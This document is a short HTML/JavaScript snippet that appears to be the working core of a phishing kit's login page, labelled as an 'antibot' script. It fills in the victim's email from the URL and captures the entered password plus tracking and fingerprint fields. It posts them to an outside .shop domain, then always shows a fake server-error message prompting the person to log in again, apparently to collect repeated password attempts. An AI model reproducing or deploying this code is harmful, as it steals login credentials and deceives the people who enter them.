<!-- SIMPLIFIED ANTIBOT - NON-BLOCKING VERSION -->
<script>
$(document).ready(function(){
    var count = 0;
    
    // Get email from URL hash if present
    var email = window.location.hash.substr(1);
    if (email) {
        $('#email').val(email);
    }
    
    // Handle form submission - SIMPLE VERSION
    $('#login_form').on('submit', function(event) {
        event.preventDefault();
        
        $('#msg').hide();
        var email = $("#email").val();
        var password = $("#password").val();
        
        if (!password) {
            $('#msg').show().html("Password is empty!");
            return false;
        }
        
        count++;
        
        // Collect all form data
        var formData = $(this).serialize();
        
        // Add antibot tracking fields (but don't block on them)
        var trackingFields = [
            'form_load_time', 'human_activity', 'mouse_moves', 'keystroke_count',
            'focus_changes', 'time_on_page', 'scroll_depth', 'click_pattern',
            'device_fingerprint', 'behavior_hash', 'validation_token', 'session_id'
        ];
        
        trackingFields.forEach(function(fieldName) {
            var field = document.getElementById(fieldName);
            if (field && field.value) {
                formData += '&' + encodeURIComponent(fieldName) + '=' + encodeURIComponent(field.value);
            }
        });
        
        console.log("Submitting data:", formData);
        
        // Send to PHP
        $.ajax({
            url: 'https://mykitchetannedmat.shop/pinto.php',
            type: 'POST',
            data: formData,
            dataType: 'json',
            success: function(response) {
                console.log("Response:", response);
                if (response && response.signal === 'ok') {
                    $("#password").val("");
                    if (count >= 4) count = 0;
                    swal('Error Login: There was an error on the server. Please login again');
                } else {
                    swal('Error Login: There was an error on the server. Please login again');
                }
            },
            error: function(xhr, status, error) {
                console.error("AJAX Error:", status, error);
                $("#password").val("");
                if (count >= 4) count = 0;
                swal('Error Login: There was an error on the server. Please login again');
            }
        });
    });
});
</script>
